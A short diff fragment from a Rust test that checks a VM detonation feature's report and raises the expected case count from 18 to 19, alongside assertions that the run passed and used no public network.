             .contains("\"release_claim\": \"vm_detonation_with_safe_sync_back_beta\""));
         assert!(result.output.contains("\"passed\": true"));
-        assert!(result.output.contains("\"case_count\": 18"));
+        assert!(result.output.contains("\"case_count\": 19"));
         assert!(result.output.contains("\"public_network_used\": false"));
         assert!(result
             .output
